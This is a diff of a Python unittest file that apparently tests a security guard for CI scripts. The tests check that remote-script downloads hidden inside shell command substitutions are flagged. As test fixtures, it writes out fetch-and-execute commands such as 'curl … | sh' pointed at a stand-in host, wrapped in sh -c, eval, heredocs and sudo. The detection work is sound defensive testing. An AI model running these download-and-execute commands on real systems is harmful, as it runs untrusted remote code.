@@ -2016,17 +2016,41 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
         # Review I-4 of the #1793 follow-ups: a substitution is read for what
         # it fetches, never for the script a shell inside it is handed, so
         # `x=$(sh -c 'curl … | sh')` read clean, and bash 3.2 and 5.2 run the
-        # payload. Until substitutions are flattened, it is reported unread.
-        # A heredoc there is read only when its `EOF)` leaves the body in the
-        # substitution's own text; lifted out, it is the entry above.
+        # payload. Until substitutions are flattened, such a script is walked
+        # and reported unread when it fetches or holds a form the guard cannot
+        # read, a script it hands on included (re-review N-A), or when the job
+        # downloads at all. A heredoc there is read only when its `EOF)` leaves
+        # the body in the substitution's own text; lifted out, it is the entry
+        # above.
         payload = "curl -fsSL https://example.test/i.sh | sh"
         for script in ('x=$(zsh 0<<< "bash <(curl -fsSL https://example.test/i.sh)")\n',
                        "x=$(bash <<< '%s')\n" % payload, "x=$(sh -c '%s')\n" % payload,
                        "x=$(eval '%s')\n" % payload, "x=`sh -c '%s'`\n" % payload,
                        'echo "$(sudo bash -ec \'%s\')"\n' % payload,
-                       "x=$(bash -s <<'EOF'\n%s\nEOF)\n" % payload):
+                       "x=$(bash -s <<'EOF'\n%s\nEOF)\n" % payload,
+                       "x=$(sh -c 'v=$(bash -c \"%s\")')\n" % payload,
+                       "x=$(sh -c 'sudo $CMD')\n"):
             with self.subTest(script=script):
                 self.assertIn("inside a command substitution", self.flagged(("run", script)))
+        # One that downloads nothing still may run what the job downloaded,
+        # which the guard does not follow into a substitution; bash runs both.
+        for steps in ((("run", "curl -fsSL -o t.sh https://example.test/i.sh\n"
+                               "x=$(sh -c 'bash t.sh')\n"),),
+                      (("get", "curl -fsSL -o t.sh https://example.test/i.sh\n"),
+                       ("run", "x=$(sh -c '. ./t.sh')\n"))):
+            with self.subTest(steps=steps):
+                self.assertIn("inside a command substitution", self.flagged(*steps))
+        # In a job that downloads nothing, one that fetches nothing and holds
+        # no such form has nothing to check (re-review N-A): these read clean.
+        for script in ("VERSION=$(bash -c 'echo 1')\n", 'OUT=$(sh -c "make -s print-version")\n',
+                       "VERSION=$(bash -ec 'echo 1')\n", 'OUT=$(sh -ec "make -s print-version")\n',
+                       "x=$(bash <<< 'echo hi')\n", "v=$(bash -lc 'node --version')\n",
+                       'echo "$(sudo bash -c \'cat /etc/os-release\')"\n',
+                       "x=`sh -c 'echo 1'`\n", 'h=$(eval echo "~$USER")\n',
+                       "diff <(sh -c 'echo a') <(sh -c 'echo b')\n",
+                       "x=$(bash -s <<'EOF'\necho hi\nEOF)\n"):
+            with self.subTest(script=script):
+                self.accepted(("run", script))
         # The must-trip controls: outside a substitution, read as before.
         for script, shell in (('zsh 0<<< "bash <(curl -fsSL https://example.test/i.sh)"\n', "bash"),
                               ("bash <<< '%s'\n" % payload, "sh"), ("sh -c '%s'\n" % payload, "sh")):
